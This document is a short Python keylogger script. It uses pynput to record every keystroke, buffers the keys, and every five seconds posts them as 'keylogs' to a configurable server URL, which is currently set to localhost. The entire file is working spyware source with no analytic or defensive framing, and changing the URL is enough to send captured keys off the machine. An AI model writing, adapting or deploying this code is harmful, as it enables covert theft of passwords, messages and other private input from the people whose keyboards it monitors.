from pynput import keyboard
import aiohttp
import asyncio

SERVER_URL = 'http://127.0.0.1:12345/endpoint' # This is currently set to localhost
buffer = []


async def send_to_server(data):
    async with aiohttp.ClientSession() as session:
        try:
            async with session.post(SERVER_URL, data={'keylogs': data}) as response:
                if response.status == 200:
                    print("Data sent successfully.")
                else:
                    print(f"Failed to send data: {response.status}")
        except Exception as e:
            print(f"An error occurred: {e}")


async def process_buffer():
    global buffer
    while True:
        if buffer:
            data = ''.join(buffer)
            buffer = []
            await send_to_server(data)
        await asyncio.sleep(5)  # every 5 seconds send the data to the server


def on_press(key):
    try:
        key_char = key.char
    except AttributeError:
        key_char = str(key)

    print(f"Key pressed: {key_char}")
    buffer.append(key_char)


async def main():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    await process_buffer()


if __name__ == "__main__":
    asyncio.run(main())
